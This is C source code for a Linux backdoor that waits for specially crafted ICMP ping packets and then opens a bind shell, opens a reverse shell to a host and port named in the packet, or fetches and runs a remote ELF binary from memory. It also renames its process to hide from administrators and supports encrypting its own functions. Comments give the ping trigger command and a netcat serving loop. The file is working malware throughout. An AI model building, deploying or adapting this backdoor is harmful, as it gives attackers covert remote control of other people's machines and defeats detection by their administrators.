#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>
#include <sys/syscall.h>

#ifdef ELFCRYPT
#include "ELFcrypt.h"
#endif


/* You should change these */
#define SHELLNAME	"icmp-backdoor-shell"
#define PARENTNAME      "ICMP-backdoor"
#define SHELL		"/bin/sh"


/* prototypes */
void reverse_shell(char *, uint16_t);
void bind_shell(char *, uint16_t);
void memfd_create_remote(char *, uint16_t);


/* commands structure.
 *
 * command is the magic bytes from ping pattern
 * function is the function executed
 *
 * ping -c1 -p $(./calc.py host port [command hexadecimal]) victim
 */
struct commands {
  uint16_t	command;
  void		*function;
} commands[] = {
  { 0x3131, bind_shell },
  { 0x2a7e, reverse_shell },
  { 0x4282, memfd_create_remote }
};


/* memfd_create_remote() - retrieve an ELF over the network and execute it.
 *
 * Args:
 *     ipstr - IP address
 *     port  - port
 *
 * Example:
 *     while [ 1 ]; do cat /bin/ps|nc -nlvp 4445; done
 *
 *     Send magic packet for this command, and icmp-backdoor will connect to
 *     ip:port, retrieve /bin/ps, and execute it.
 *
 *     Don't do nc -knlvp because it fails to send EOF and hangs processes.
 *
 * TODO: if kernel doesnt support memfd_create, use tmp or shm
 */
#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

static inline int memfd_create(const char *name, unsigned int flags) {
  return syscall(__NR_memfd_create, name, flags);
}

#ifdef ELFCRYPT
CRYPTED
#endif
void memfd_create_remote(char *ipstr, uint16_t port) {
  int			sock;
  int			memfd;
  struct sockaddr_in	client;
  char 			*argv[] = { SHELLNAME, NULL };


  client.sin_family = AF_INET;
  client.sin_port = htons(port);
  client.sin_addr.s_addr = inet_addr(ipstr);

  sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

  if (connect(sock, (struct sockaddr *)&client, sizeof(client)) == -1)
    return;

  // TODO: randomize fd name
  memfd = memfd_create("asdfasdf", MFD_CLOEXEC);
  if (memfd == -1)
    return;

  for (;;) {
    int		n;
    char	buf[4096];

    n = read(sock, buf, sizeof(buf));
    write(memfd, buf, n);

    if (n < sizeof(buf))
      break;
  }

  close(sock);

  fexecve(memfd, argv, NULL);

  close(memfd);
}


/* bind_shell() - standard bind shell
 *
 * Args:
 *     ipstr - IP address
 *     port  - port
 *
 * Returns:
 *     Nothing.
 */
#ifdef ELFCRYPT
CRYPTED
#endif
void bind_shell(char *ipstr, uint16_t port) {
  int			server;
  int			client;
  struct sockaddr_in	addr;


  server = socket(AF_INET, SOCK_STREAM, 0);

  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);
  addr.sin_addr.s_addr = INADDR_ANY; // TODO: use ipstr

  // TODO error check
  bind(server, (struct sockaddr *)&addr, sizeof(addr));
  listen(server, 0);

  client = accept(server, NULL, NULL);

  dup2(client, STDERR_FILENO);
  dup2(client, STDOUT_FILENO);
  dup2(client, STDIN_FILENO);

  execl(SHELL, SHELLNAME, NULL);
}


/* reverse_shell() - Standard reverse shell
 *
 * Args:
 *     ipstr - IP address to connect to.
 *     port  - port to connect to.
 *
 * Returns:
 *     Nothing.
 */
#ifdef ELFCRYPT
CRYPTED
#endif
void reverse_shell(char *ipstr, uint16_t port) {
  int			client;
  struct sockaddr_in	shell;


  shell.sin_family = AF_INET;
  shell.sin_port = htons(port);
  shell.sin_addr.s_addr = inet_addr(ipstr);

  client = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
  connect(client, (struct sockaddr *)&shell, sizeof(shell));

  dup2(client, STDERR_FILENO);
  dup2(client, STDOUT_FILENO);
  dup2(client, STDIN_FILENO);

  execl(SHELL, SHELLNAME, NULL);
}


#ifdef ELFCRYPT
CRYPTED
#endif
int main2(int argc, char *argv[]) {
  int			s;
  int			n;
  char			buf[1024];
  uint8_t		ip[4];
  char			ipstr[15];
  uint8_t		portstr[2];
  uint16_t		port;
  struct ip             *iphdr;
  struct icmphdr        *icmphdr;
  unsigned int          offset;


  /* rename argv[0] to disguise ourselves from wack sysadmins */
  if (strlen(argv[0]) >= strlen(PARENTNAME)) {
    memset(argv[0], '\0', strlen(argv[0]));
    strcpy(argv[0], PARENTNAME);
  }

  /* Reap child processes */
  signal(SIGCHLD, SIG_IGN);

  s = socket (AF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (s == -1) {
    fprintf(stderr, "socket(): %s\n", strerror(errno));
    return EXIT_FAILURE;
  }

  /* ip header(20) + icmp header(8) + timestamp(8) + 8 bytes added by ping */
  offset = sizeof(struct ip) + sizeof(icmphdr) + 8 + 8;

  if (fork() == 0) {
    for (;;) {
      memset(buf, 0, sizeof(buf));

      n = recv(s, buf, sizeof(buf), 0);
      // TODO: white/blacklists
      iphdr = (struct ip *)buf;
      icmphdr = (struct icmphdr *)(buf + sizeof(struct ip));

      if (icmphdr->type != ICMP_ECHO)
	continue;

      if (n > 51) {
	int		i;
	void		(*function)() = NULL;
	uint16_t	cmd;


	cmd = (buf[offset + 6] << 8) | (buf[offset + 7] & 0xff);

	/*
	 * Check if a function is listed in commands[].
	 * Note: all commands must take ipstr and port arguments whether or
	 * not they use them, and there isn't a good way to keep using `ping`
	 * as a trigger and pass extra arguments.
	 *
	 * TODO: make new script that doesn't use ping for extra arguments.
	 *       pass the entire content of the packet to the functions, then
	 *       its up to the programmer to parse any data out of it.
	 */
	for (i = 0; i < sizeof(commands) / sizeof(struct commands); i++) {
	  if (commands[i].command == cmd) {
	    function = (void(*)())commands[i].function;
	    break;
	  }
	}

	if (function == NULL)
	  continue;

	ip[0] = buf[offset];
	ip[1] = buf[offset + 1];
	ip[2] = buf[offset + 2];
	ip[3] = buf[offset + 3];

	portstr[0] = buf[offset + 4];
	portstr[1] = buf[offset + 5];

	port = portstr[0] << 8 | portstr[1];
	sprintf(ipstr, "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);

	if (fork() == 0)
	  function(ipstr, port);
      }
    }

  } //fork()

  return EXIT_SUCCESS;
}


int main(int argc, char *argv[]) {
#ifdef ELFCRYPT
  ELFdecrypt(NULL);
#endif

  return main2(argc, argv);
}
